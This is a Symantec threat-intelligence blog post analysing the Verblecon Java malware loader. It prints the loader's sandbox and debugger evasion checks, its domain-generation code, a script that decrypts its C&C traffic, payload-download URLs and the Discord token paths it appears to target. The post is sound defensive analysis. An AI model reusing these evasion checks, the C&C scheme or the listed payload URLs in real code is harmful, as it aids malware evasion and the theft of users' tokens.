@@ -1,0 +1,330 @@
+<div><figure class="author__image"><img alt="" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_author_avatar_small/public/2017-10/author-profile-default.jpg.webp?h=6386ac74&amp;itok=yMcB1DYB" style="max-width:80%;height:auto;width:auto;"/></figure>Threat Hunter TeamSymantec<a class="twitter" href="https://twitter.com/intent/tweet?text=Verblecon%3A%20Sophisticated%20New%20Loader%20Used%20in%20Low-level%20Attacks&amp;url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fverblecon-sophisticated-malware-cryptocurrency-mining-discord" rel="noopener" target="_blank" title="Twitter">Twitter</a><a class="linkedin" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fverblecon-sophisticated-malware-cryptocurrency-mining-discord&amp;token=&amp;isFramed=true" rel="noopener" target="_blank" title="LinkedIn">LinkedIn</a>SHAREPosted: 29 Mar, 20228 Min Read<a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence">Threat Intelligence</a>Follow<a href="https://twitter.com/threatintel" title="twitter">twitter</a><a href="https://www.linkedin.com/company/broadcomsoftware" title="linkedin">linkedin</a><h1 class="blog-post__title" id="page-title">Verblecon: Sophisticated New Loader Used in Low-level Attacks</h1><h2 class="blog-post__subtitle">Indications the attacker may not realize the potential capabilities of the malware they are using.</h2><p>An unknown attacker is using a complex and powerful new malware loader in relatively unsophisticated and low-reward attacks, indicating they may not realize the potential capabilities of the malware they are deploying.</p>
+<p>The malware, Trojan.Verblecon, is being used in attacks that appear to have installing cryptocurrency miners on infected machines as their end goal. There are some indications the attacker may also be interested in stealing access tokens for chat app Discord. However, the capabilities of this malware indicate that it could be highly dangerous if leveraged in ransomware or espionage campaigns.</p>
+<p>Verblecon was first spotted by analysts from Symantec, a division of <a href="https://software.broadcom.com/">Broadcom Software</a>, in January 2022. This blog will detail the capabilities of the malware.</p>
+<h2>Technical breakdown</h2>
+<p>The malware is loaded as a server-side polymorphic JAR file. The fact that the file is polymorphic means that, due to encryption and obfuscation, the code of the malware payload looks different each time it is downloaded. Attackers generally pack malware in this way in an effort to evade detection by security software.</p>
+<p>The malware samples analyzed by Symantec were fully obfuscated, in the code flow, strings, and symbols. The samples themselves may be based on <a href="https://github.com/zettabithf/LiteHTTP">publicly available code</a>.</p>
+<p>Once started, the malware checks its command-line arguments. It requires at least one command-line argument to execute, which could be the infection or campaign ID initially e.g.</p>
+<p>"CSIDL_SYSTEM_DRIVE\program files\java\jre1.8.0_301\bin\javaw.exe" -jar "CSIDL_PROFILE\appdata\local\temp\rpvbh.jar" masonkhonsari</p>
+<p>and</p>
+<p>"CSIDL_SYSTEM_DRIVE\program files\java\jre1.8.0_301\bin\javaw.exe" -jar "CSIDL_PROFILE\appdata\local\temp\rpvbh.jar" 923ec15ffa4474ca7bf200bfb90e782d</p>
+<p>Additionally, it also attempts to determine if its own process is being debugged by checking for the following Java command-line arguments:</p>
+<ul>
+<li>"-xbootclasspath"</li>
+<li>"-xdebug"</li>
+<li>"-agentlib"</li>
+<li>"-javaagent:"</li>
+<li>"-xrun:"</li>
+<li>"-verbose"</li>
+<li>"-agentpath:"</li>
+</ul>
+<p>Next, it attempts to detect if it is being opened in a virtual or sandbox environment, which would indicate it is likely being opened on a security researcher’s machine.</p>
+<p>First, it checks for the following directories:</p>
+<ul>
+<li>"%ProgramFiles(X86)%\VMware\VMware Tools"</li>
+<li>"%ProgramFiles(X86)%\Oracle\VirtualBox Guest Additions"</li>
+</ul>
+<p>It also obtains the machine MAC address and attempts to check for the following prefixes, which may indicate the file is being opened on a virtual machine:</p>
+<ul>
+<li>"00:05:69"</li>
+<li>"00:0C:29"</li>
+<li>"00:1C:14"</li>
+<li>"00:50:56"</li>
+<li>"08:00:27"</li>
+<li>"00:16:3E"</li>
+<li>"00:1C:42"</li>
+<li>"0A:00:27"</li>
+</ul>
+<p>Following those checks, it executes the following command to obtain a list of running processes:</p>
+<ul>
+<li>tasklist.exe /fo csv /nh</li>
+</ul>
+<p>It then appears to check these processes against a set list:</p>
+<ul>
+<li>"vboxservice.exe"</li>
+<li>"vboxtray.exe"</li>
+<li>"xenservice.exe"</li>
+<li>"vmtoolsd.exe"</li>
+<li>"vmwaretray.exe"</li>
+<li>"vmwareuser.exe"</li>
+<li>"vgauthservice.exe"</li>
+<li>"vmacthlp.exe"</li>
+<li>"vmsrvc.exe"</li>
+<li>"vmusrvc.exe"</li>
+<li>"prl_cc.exe"</li>
+<li>"prl_tools.exe"</li>
+<li>"qemu-ga.exe"</li>
+<li>"vmcomputeagent.exe"</li>
+<li>"sandboxie"</li>
+<li>"vdagent"</li>
+<li>"vdservice"</li>
+<li>"fiddler"</li>
+<li>"joeboxserver.exe"</li>
+<li>"joeboxcontrol.exe"</li>
+<li>"blnsvr.exe"</li>
+</ul>
+<p>It then also checks for the following files:</p>
+<ul>
+<li>"%Windows%\system32\windanr.exe"</li>
+<li>"%Windows%\system32\drivers\VBoxMouse.sys"</li>
+<li>"%Windows%\system32\drivers\VBoxGuest.sys"</li>
+<li>"%Windows%\system32\drivers\VBoxSF.sys"</li>
+<li>"%Windows%\system32\drivers\VBoxVideo.sys"</li>
+<li>"%Windows%\system32\vboxdisp.dll"</li>
+<li>"%Windows%\system32\vboxhook.dll"</li>
+<li>"%Windows%\system32\vboxmrxnp.dll"</li>
+<li>"%Windows%\system32\vboxogl.dll"</li>
+<li>"%Windows%\system32\vboxoglarrayspu.dll"</li>
+<li>"%Windows%\system32\vboxoglcrutil.dll"</li>
+<li>"%Windows%\system32\vboxoglerrorspu.dll"</li>
+<li>"%Windows%\system32\vboxoglfeedbackspu.dll"</li>
+<li>"%Windows%\system32\vboxoglpackspu.dll"</li>
+<li>"%Windows%\system32\vboxoglpassthroughspu.dll"</li>
+<li>"%Windows%\system32\vboxservice.exe"</li>
+<li>"%Windows%\system32\vboxtray.exe"</li>
+<li>"%Windows%\system32\VBoxControl.exe"</li>
+<li>"%Windows%\system32\Drivers\Vmmouse.sys"</li>
+<li>"%Windows%\system32\Drivers\vm3dgl.dll"</li>
+<li>"%Windows%\system32\Drivers\vmdum.dll"</li>
+<li>"%Windows%\system32\Drivers\vm3dver.dll"</li>
+<li>"%Windows%\system32\Drivers\vmtray.dll"</li>
+<li>"%Windows%\system32\Drivers\VMToolsHook.dll"</li>
+<li>"%Windows%\system32\Drivers\vmmousever.dll"</li>
+<li>"%Windows%\system32\Drivers\vmhgfs.dll"</li>
+<li>"%Windows%\system32\Drivers\vmGuestLib.dll"</li>
+<li>"%Windows%\system32\Drivers\VmGuestLibJava.dll"</li>
+<li>"%Windows%\system32\Driversvmhgfs.dll"</li>
+<li>"[java.lang.System.getProperty("user.home")]\Desktop\moutonheart.wav"</li>
+</ul>
+<p>Next, it appears to check the user name against the following:</p>
+<ul>
+<li>java.lang.System.getProperty("user.name") == "WDAGUtilityAccount"</li>
+<li>java.lang.System.getProperty("user.name").startsWith("hal-")</li>
+</ul>
+<p>Then it executes the following command:</p>
+<ul>
+<li>reg query "HKU\S-1-5-19"</li>
+</ul>
+<p>It is unclear how the output is processed, however, there are some strings that could be related to this or other registry checks:</p>
+<ul>
+<li>"HARDWARE\ACPI\DSDT\"</li>
+<li>"HARDWARE\ACPI\FADT\"</li>
+<li>"HARDWARE\ACPI\RSDT\"</li>
+<li>"SOFTWARE\Oracle\"</li>
+<li>"SYSTEM\ControlSet001\Services\"</li>
+<li>"SYSTEM\ControlSet001\Services\"</li>
+<li>"SOFTWARE\Microsoft\Virtual Machine\Guest\"</li>
+<li>"SOFTWARE\VMware, Inc.\"</li>
+<li>"SOFTWARE\"</li>
+<li>"VBOX__"</li>
+<li>"VBOX__"</li>
+<li>"VirtualBox Guest Additions"</li>
+<li>"VBoxGuest"</li>
+<li>"VBoxMouse"</li>
+<li>"VBoxService"</li>
+<li>"VBoxSF"</li>
+<li>"VBoxVideo"</li>
+<li>"Parameters"</li>
+<li>"VMware Tools"</li>
+<li>"Wine"</li>
+</ul>
+<p>If satisfied with these checks, it may copy itself as one of the following files:</p>
+<ul>
+<li>"%ProgramData%[INFECTION_ID][INFECTION_ID].jar"</li>
+<li>"%ALL_USERS_HOME%[INFECTION_ID][INFECTION_ID].jar"</li>
+<li>"%LOCALAPPDATA%[INFECTION_ID][INFECTION_ID].jar"</li>
+</ul>
+<p>And then create one of the following files to use as a loadpoint:</p>
+<ul>
+<li>"%HOMEPATH%\Library\LaunchAgents[INFECTION_ID].plist"</li>
+<li>"%Windows%\System32\Tasks[INFECTION_ID]"</li>
+</ul>
+<p>[INFECTION_ID] is computed as follows:</p>
+<ul>
+<li>hashlib.md5(b"%PROCESSOR_IDENTIFIER%%COMPUTERNAME%[USER_NAME]").hexdigest()</li>
+</ul>
+<p>Then it periodically attempts to connect to the following URLs:</p>
+<ul>
+<li>"hxxps://gaymers[.]ax/"</li>
+<li>"hxxp://[DGA_NAME][.]tk/"</li>
+</ul>
+<p>[DGA_NAME] is apparently generated using the following method:</p>
+<code class="hljs">import datetime
+import hashlib
+def dga(day):
+ seed = bytes(day.strftime("%Y-%m-%d"), "ascii") + b"verble"
+ md5 = hashlib.md5(seed)
+ return md5.hexdigest()
+print(dga(datetime.date.today()))
+</code><p>The traffic generated by the malware looks like this:</p>
+<code class="hljs">POST / HTTP/1.1
+User-Agent: VerbleConnectTM
+Content-Type: application/x-www-form-urlencoded
+charset: utf-8
+Cache-Control: no-cache
+Pragma: no-cache
+Host: gaymers.ax
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-Length: 2
+k=</code><p>The server response appears as the below. Some of the strings in this response indicate that the attacker may be leveraging legitimate Cloudflare infrastructure to host some of their C&amp;C infrastructure.</p>
+<code class="hljs">HTTP/1.1 200 OK
+Date: Fri, 28 Jan 2022 21:27:31 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+CF-Cache-Status: DYNAMIC
+Expect-CT: max-age=604800, report-uri="hxxps://report-uri[.]cloudflare.com/cdn-cgi/beacon/expect-ct"
+Report-To: {"endpoints":[{"url":"hxxps:\/\/a.nel.cloudflare[.]com\/report\/v3?s=IoiU38KEKgi24kr9QHrmWg%2F%2B7pJc7jkKFghTxjGEGnFLDYDVtn0jrsN5FVkZrQAb9XUJlyEAjfQM%2BZ%2FJVPN4wTrU6Otancwny335hs3uyGy6DoE%2B9nl8eKz9mdDr"}],"group":"cf-nel","max_age":604800}
+NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
+Server: cloudflare
+CF-RAY: 6d4d4e246b68cdab-CDG
+alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
+3c0
+J2dHYN2DE/N7JQj5ZdxyMVjISfLstuKFQjzMhEcxqaTQvAb3hpYZXlGHMn3mSoG3++twgiJEAjadSFco/P7qgd9mZz+4rzTksF23RJ0BsTRzH7Z2tAF0b62gwh+jTVgeupvenZoqw1+h/YKaF/lknZ11Cp5dgVKe9mxifc1b7t2FpTeqYMhT5NoyoWx/99mxyBt9OSDzJviK3fhJq+yhCDsZ3TWsYdZBAU2q0gQGYbmGT1w1DSbF+bcZ3rL47RHBKK2+NpkKmVMSoaL2d6SyGxom++MEiwIRTkhVtewxZPuXOeJ9AbZ9VqEnBo+77T3x7sxgX19PO8z9Rdbp7uHJ/8HLXEZcQnHjHBbRPQQcCFH5R/XNLmIHjaRApikb8QuRVJAVdDmNnpRpExWIbZ7k0R6AjiPDkuIAK+bj3v11HnQbVxIDBj9/GUI6XZDVACnSyUkeNprXB+FyC/ppfwwzyvtHj/BTyAX5UFfeghFym7qRa3UxZxw5H/PTukCPkdquEw/zXdlEf6hj0/2GNXHIhamrXeJ8WPfpsnHhgYaSHi83CKE6y2WMUdrCxeXgdvUg5sD6qyqrIiP+VLQeN22gIKuGlE1lh2Mm2JcrnHKq6P2G9fu2E6ZzoKL8N8KfuzCc8JqTGHVhjCDkSEgUCT8iXbvI6VqScV3vZ1Irc5Gd1T6w2NF4wd2zsRWAO7s+0aFCcKsFv0MHkYNpZPWdOX+tTgJZFigbsJ/IOHXSyxfUN0MLeEDEAbR9ymFB3uU9bbfeNlUWlVJxenLRtQLHxJDXQFBugRfFM0nJVxPIZHWcj22dlnyrqYUIX5Q8X8qNsXkz64DsrTBXMa52LrgeKDKNrQw+7Xpat5601VXUM80CVIfwhmmC5LiLP9ef0NuuDtkMDiX8KQdAWlMknOq8N0Z2TxKnznlCoJ27f0VSCVYD/3iepe5f+8EPD3Ob7CPOs0zB
+0</code><p>The server response body above is an encrypted blob that contains a URL signed with an RSA key. This blob can be decrypted and validated as follows:</p>
+<code class="hljs">#!/usr/bin/python3
+import Crypto.Cipher.AES
+import Crypto.Hash.SHA256
+import Crypto.PublicKey.RSA
+import Crypto.Signature.pkcs1_15
+import Crypto.Util.Padding
+import base64
+# from sample
+aes_key = b"cYIoouG6CRk3ds6dZAfRdQOomHfxOFJ6"
+aes_iv = b"FjP2PQfztKZ7vKxL"
+rsa_certificate = "MIIFazCCA1OgAwIBAgIUQDUa4ddMSiYJ+8dB2v1yF6kfWsQwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDA3MjMxODIxMzdaFw0yMDA4MjIxODIxMzdaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDeWLWJkfkpeRy9Bw7OIkJCQs7cO06qrD5vgFNI9p47cVYyf0NH5FuqX41veoTTBe+iA/77j1L/ffO5qCBFkct/d7YpNsCDjfoqjoL6T6GJ5WGPU/9uR7GctoXoESUdq03TYw8GttIq25EyyWUfjsNL/iljVomiffAJTKkcnOKnA0NYgrWmgxghiJGNXwHbYau9NH7hAthYZcBUxzWqTS8hCI2fupQ14yoAwU0YlYpL5XtmzkCpK0qCU++G5fPr0utTp8qnKTFExwI4oFt6Umj4Z13P1EUQRetSPKva7JpNq00UVOketKFnawu99VJx1SIsQWOZ6BvOLS7QYIBdiblFzHaXxZ0ndbVTFMcSC9G3HroVlTAMWgtkZiiZr3LpuX0U1s7e+uqvkZxw+dggIfkEdKA0p2iayu80MEBJvZoyFY/11ugyaOhDlFtVlQ8rqc40IkgfM9RmxeuAhAdQfhpxaPLV/5v1OyGsG1fKETSNTVaxMlbGUsY1LwNvXeF576P9YEHpDgSg4zeWec7xrc6WWY2A5TZnyt2Pzd4G8oOjgtFHV0ZqqU8ogEizZEZ5Fs3mAi3N4N7FCrjf0QygQuksvbfi8Iim8DGmkMXzCihnN3suLOP4noWSrPfxEblY1QPiS+WK9y4kVtsJl/seohbI1P7XCUrdESvKxgBK6ziy6QIDAQABo1MwUTAdBgNVHQ4EFgQUfakZej+WCNaJNFfZ/2V2Yn9e0h8wHwYDVR0jBBgwFoAUfakZej+WCNaJNFfZ/2V2Yn9e0h8wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEARQEHcfMK2hM77F6ua/o+Y9NGE4QsFuUtGKVT/hPXF3wJuq7rpkdk8G8bksMrCBFg+XhlYM8pyTvrpqunl5Dgoew1niuwlNI2fXOsXpUSu1Gtu+5zU3gsjisnOexWZwQjBJINPzLHpsM9GrBSJXl97x50mBzkjwDU7uhNN8mfQ47GOqsZSnrUhOVIdZo7cnfmDjsSiJ3XIv122zGQCwgvHTCKctpF+hwm5IuJ+9BfAh3zTuqJ/VPkJrnKoW0dx/uaJOqSW3sjWHlIV1QRm+sRk5cGhUvIn8gU0P84rgzDcqNJC0+0GEuX/MbGzjf2nu4ow6SXNziCb4Jb4DN9YN83qXpvJC+TI0097t/3ZuZhPPuaPWpjuhMNmBafT8ImLs96VSbv7ps50lFn0R94KXNKlYJH4mncQiZo4YPEQ6WpcVjhoTR06cbAu7WgSrVMSk6CBTWjjbGLg7p579qn+Yskk4OxWB3kzig7You+z0nM2dwrQAKz3yztK7bVEsgPT/eoLjnvkKnwIkN5hwQZNXUigO/1HKcTgGFz1A8dG+qXd7ZGCoxJ7vRab1vxzMdO7VDaJJXJUUrwVZVR/xBt2Xg0yfHWQ10oiK4z9aI1F/YMhI1I3rbUAjVySLyzZSSkz2/6xQZRtcEWbrFbBI9ko8Kb752poOKybEvmM6sE33J4dvk="
+def disect_response(body):
+ decoded_body = base64.b64decode(body)
+ cipher = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_CBC, IV=aes_iv)
+ decrypted_body = cipher.decrypt(decoded_body)
+ signed_message = Crypto.Util.Padding.unpad(decrypted_body, cipher.block_size)
+ message, signature = signed_message.rsplit(b"@")
+ print("message:", message)
+ print("signature:", signature)
+ rsa_public_key = Crypto.PublicKey.RSA.import_key(base64.b64decode(rsa_certificate))
+ rsa_verifier = Crypto.Signature.pkcs1_15.PKCS115_SigScheme(rsa_public_key)
+ message_hash = Crypto.Hash.SHA256.new(message)
+ rsa_verifier.verify(message_hash, base64.b64decode(signature))
+ print("signature verification: PASS")
+disect_response("J2dHYN2DE/N7JQj5ZdxyMVjISfLstuKFQjzMhEcxqaTQvAb3hpYZXlGHMn3mSoG3++twgiJEAjadSFco/P7qgd9mZz+4rzTksF23RJ0BsTRzH7Z2tAF0b62gwh+jTVgeupvenZoqw1+h/YKaF/lknZ11Cp5dgVKe9mxifc1b7t2FpTeqYMhT5NoyoWx/99mxyBt9OSDzJviK3fhJq+yhCDsZ3TWsYdZBAU2q0gQGYbmGT1w1DSbF+bcZ3rL47RHBKK2+NpkKmVMSoaL2d6SyGxom++MEiwIRTkhVtewxZPuXOeJ9AbZ9VqEnBo+77T3x7sxgX19PO8z9Rdbp7uHJ/8HLXEZcQnHjHBbRPQQcCFH5R/XNLmIHjaRApikb8QuRVJAVdDmNnpRpExWIbZ7k0R6AjiPDkuIAK+bj3v11HnQbVxIDBj9/GUI6XZDVACnSyUkeNprXB+FyC/ppfwwzyvtHj/BTyAX5UFfeghFym7qRa3UxZxw5H/PTukCPkdquEw/zXdlEf6hj0/2GNXHIhamrXeJ8WPfpsnHhgYaSHi83CKE6y2WMUdrCxeXgdvUg5sD6qyqrIiP+VLQeN22gIKuGlE1lh2Mm2JcrnHKq6P2G9fu2E6ZzoKL8N8KfuzCc8JqTGHVhjCDkSEgUCT8iXbvI6VqScV3vZ1Irc5Gd1T6w2NF4wd2zsRWAO7s+0aFCcKsFv0MHkYNpZPWdOX+tTgJZFigbsJ/IOHXSyxfUN0MLeEDEAbR9ymFB3uU9bbfeNlUWlVJxenLRtQLHxJDXQFBugRfFM0nJVxPIZHWcj22dlnyrqYUIX5Q8X8qNsXkz64DsrTBXMa52LrgeKDKNrQw+7Xpat5601VXUM80CVIfwhmmC5LiLP9ef0NuuDtkMDiX8KQdAWlMknOq8N0Z2TxKnznlCoJ27f0VSCVYD/3iepe5f+8EPD3Ob7CPOs0zB")</code><p>The malware then starts communicating with the decoded URL by sending details about the infected computer:</p>
+<code class="hljs">POST /mafia/login.php HTTP/1.1
+User-Agent: VerbleConnectTM
+Content-Type: application/x-www-form-urlencoded
+charset: utf-8
+Cache-Control: no-cache
+Pragma: no-cache
+Host: gaymers.ax
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-Length: 291
+id=il~aSS_3ZNaXHMGXLExSyzp6xMrxMB7zCw1zFndLA87jjqd0tPsFqY31LF65YGEt&amp;os=5i1E5v8J8fUqwpvNWkN6QQ&amp;pv=6qWqTXHlWudJmSz_fuWcBA&amp;ip=VfseCVZvINz5rCbXun59pfGFCSmrpUXBVtrqt_4REs8&amp;cn=QN9v6e3VlZM1oosbryBr~7DoU95gMv4JDw68m35voF0&amp;lr=ZrXBJ3IJZ5ymR2zc1~faVQ&amp;ct=GOi8TbTvN6vucG76f8fCGg&amp;bv=tdCMf_RP_QPO3xfcoRGJww</code><p>The request body contains the following information about the infected machine in encrypted form:</p>
+<ul>
+<li>"id" is [INFECTION_ID</li>
+<li>"os" is OS version, e.g. "Windows 10"</li>
+<li>"pv" is "Admin" when running with Administrator privileges</li>
+<li>"ip" is JAR pathname</li>
+<li>"cn" is "[USER_NAME]@[COMPUTERNAME]"</li>
+<li>"lr" has value "00:00:00"</li>
+<li>"ct" has value "0"</li>
+<li>"bv" has value "v1.0.0"</li>
+</ul>
+<p>The server has been observed to respond as follows:</p>
+<code class="hljs">HTTP/1.1 200 OK
+Date: Fri, 28 Jan 2022 21:29:26 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+CF-Cache-Status: DYNAMIC
+Expect-CT: max-age=604800, report-uri="hxxps://report-uri[.]cloudflare.com/cdn-cgi/beacon/expect-ct"
+Report-To: {"endpoints":[{"url":"hxxps:\/\/a.nel.cloudflare[.]com\/report\/v3?s=JE2u6s575flQq%2BEumTamotRln2IsYdLgqtQHy0tGJwQp9tuxhWThqxtCzsMG6vVgc%2Fa76jGYsP8hb68S3hKu8Q5lm6H2iIYElyVHw4WOcGSLqi%2FLR6AX5RcYlsXd"}],"group":"cf-nel","max_age":604800}
+NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
+Server: cloudflare
+CF-RAY: 6d4d50f69c993a8d-CDG
+alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
+98
+Rc0OiT8tzq68CmJ7bi0SMLtCQQH8bjxlid0OONwvn+x9g2ku8Ocfx+lT+TZXBzLC9/K7hJ/efOYWz9e1HC3KrRkQoh3OTZezXIOhJ6gTRPiLeqDgCGT79FcFqm7SFEDPHl1NpR14dl/6R92VwKZE/A==
+0</code><p>Where the response body can be decrypted as follows:</p>
+<code class="hljs">newtask:1:Mw==:YUhSMGNITTZMeTlxYjI1aGRHaGhibWhoY21SM2FXTnJMbTFsTDJoaGNtUjNhV05yTG1waGNuNXpkR0Z5ZEE9PQ==</code><p>The last term above contains the following string:</p>
+<ul>
+<li>hxxps://jonathanhardwick[.]me/hardwick.jar~start</li>
+</ul>
+<p>Some samples of the malware are seen communicating with the following servers:</p>
+<ul>
+<li>gaymers[.]ax</li>
+<li>6f3af6ffb074513b51bba688a0b41df7[.]tk</li>
+</ul>
+<p>Communication between the malware and servers is over HTTP or HTTPS and this communication appears to culminate with victims being directed to connect to the following:</p>
+<code class="hljs">POST /mafia/login.php HTTP/1.1
+User-Agent: VerbleConnectTM
+Content-Type: application/x-www-form-urlencoded
+charset: utf-8
+Cache-Control: no-cache
+Pragma: no-cache
+Host: gaymers.ax
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-Length: 291
+id=il~aSS_3ZNaXHMGXLExSyzp6xMrxMB7zCw1zFndLA87jjqd0tPsFqY31LF65YGEt&amp;os=5i1E5v8J8fUqwpvNWkN6QQ&amp;pv=6qWqTXHlWudJmSz_fuWcBA&amp;ip=VfseCVZvINz5rCbXun59p</code><p>The payload is downloaded from the URL observed earlier:</p>
+<ul>
+<li>hxxps://jonathanhardwick[.]me/hardwick.jar</li>
+</ul>
+<p>The payload is obfuscated in a similar way to the other samples, and also contains similar techniques to detect the virtualization environment, as well as other functionality.</p>
+<p>The core functionality is to download and execute a binary blob from the following URL:</p>
+<ul>
+<li>hxxps://jonathanhardwick[.]me/hardwick.bin</li>
+</ul>
+<p>The blob is decrypted along with *.bin artifacts from the same host. The downloaded blob is then cached on the local filesystem (in re-encrypted form) and injected into %Windows%\SysWow64\dllhost.exe for execution.</p>
+<p>The injection is performed using com.sun.jna and doesn't use usual APIs for injection.</p>
+<p>The final payload (hardwick.bin) contains the following embedded URL pointing to a configuration file for a cryptocurrency miner:</p>
+<ul>
+<li>hxxps://jonathanhardwick[.]me/config[.]txt</li>
+</ul>
+<p>This indicates that the purpose of this activity was to install cryptocurrency mining software on victim machines.</p>
+<h2>What is the goal of this campaign?</h2>
+<p>The evidence found on victim networks appears to indicate that the goal of the attacker was to install cryptocurrency mining software on victim machines. This would appear to be a relatively low-reward goal for the attacker given the level of effort that would have been required to develop this sophisticated malware.</p>
+<p>There are also indications that the attacker may be stealing Discord tokens and using these to advertise Trojanized videogame applications.</p>
+<p>We suspect they were stealing Discord tokens because some of the obfuscated strings refer to pathnames that are apparently related to Discord clients, specifically:</p>
+<ul>
+<li>"AppData\Roaming\discordcanary\Local Storage\leveldb"</li>
+<li>"AppData\Roaming\discordptb\Local Storage\leveldb"</li>
+<li>"Library\Application Support\discord\Local Storage\leveldb"</li>
+<li>"Library\Application Support\discordcanary\Local Storage\leveldb"</li>
+<li>"Library\Application Support\discordptb\Local Storage\leveldb"</li>
+<li>".config\discordcanary\Local Storage\leveldb"</li>
+<li>".config\discordptb\Local Storage\leveldb"</li>
+</ul>
+<p>Discord is a group chatting app that is particularly popular among the gaming community. Advertising Trojanized videogame applications via Discord is likely a redistribution channel for Trojan.Verblecon.</p>
+<h2>Could this be used to distribute ransomware? </h2>
+<p>Most of the infections we saw where this malware was used were on non-enterprise machines; we rarely see ransomware deployed on non-enterprise machines.</p>
+<p><a href="https://appsecphoenix.com/the-impact-of-log4shell-vulnerability/">Previous reports</a> have connected related domains to a single occurrence of ransomware, but the infrastructure may be shared with an unrelated actor. The similarities between that incident and the activity we observed includes:</p>
+<ul>
+<li>The use of “verble” in the domain name</li>
+<li>The downloading of shellcode for execution</li>
+<li>Similar obfuscation</li>
+</ul>
+<p>However, we do not have enough evidence to draw a definitive link between both these sets of activity.</p>
+<h2>Power in the hands of an inexperienced actor?</h2>
+<p>The activity we have seen carried out using this sophisticated loader indicates that it is being wielded by an individual who may not realize the capabilities of the malware they are using. However, if it fell into the hands of a more sophisticated actor the potential is there for this loader to be used for more serious attacks, including potentially ransomware and espionage campaigns.</p>
+<h2>Protection</h2>
+<p>File-based</p>
+<ul>
+<li>Trojan.Verblecon</li>
+</ul>
+<p>For the latest protection updates, please visit the <a href="https://www.broadcom.com/support/security-center/protection-bulletin">Symantec Protection Bulletin</a>.</p>
+<h2>Indicators of Compromise (IoCs)</h2>
+<p>If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.</p>
+<p> </p>
+<p>32a9415daa7f37a93dd0b347461844673c0f5baf0c15c01ee48b147dadf28299</p>
+<p>3688c249774cc9a28d2b9b316921cec842bb087c57f4733cf5866226fbe2aeed</p>
+<p>5a4f6332ad08b35c055bb5e6dfddc79d2f7905e63fac7595efbedd0b27f12eb8</p>
+<p>007f5898c52c3aa1c3dca6d3a30f28f5f72d9789fbb440ae656d88959f68e53e</p>
+<p>f3f4af5f5eae1a28ad5a01b56d71302a265bce17d2c87ce731edf440612818a6</p>
+<p>hxxp://verble[.]software/styles.jar</p>
+<p>hxxps://jonathanhardwick[.]me/hardwick.jar</p>
+<p>hxxps://jonathanhardwick[.]me/hardwick.bin</p>
+<p>hxxps://jonathanhardwick[.]me/config.txt</p>
+<p>hxxp://test.verble[.]rocks/dorflersaladreviews.jar</p>
+<p>hxxp://test.verble[.]rocks/dorflersaladreviews.bin</p>
+<p> </p>
+<img alt="" src="https://symantec-enterprise-blogs.security.com/sites/default/files/styles/blogs_author_bio_small/public/2017-10/author-profile-default.jpg.webp?h=6386ac74&amp;itok=w8Rg1PQZ" style="max-width:80%;height:auto;width:auto;"/><h2 class="blog-author__title">About the Author</h2><h3 class="blog-author__name">Threat Hunter Team</h3><h4 class="blog-author__position">Symantec</h4><p>The Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.</p><h2 class="blog-post__comment-title">Want to comment on this post?</h2><p>We encourage you to share your thoughts on your favorite social platform.</p><a class="twitter" href="https://twitter.com/intent/tweet?text=Verblecon%3A%20Sophisticated%20New%20Loader%20Used%20in%20Low-level%20Attacks&amp;url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fverblecon-sophisticated-malware-cryptocurrency-mining-discord" rel="noopener" target="_blank" title="Twitter">Twitter</a><a class="linkedin" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fverblecon-sophisticated-malware-cryptocurrency-mining-discord&amp;token=&amp;isFramed=true" rel="noopener" target="_blank" title="LinkedIn">LinkedIn</a></div>
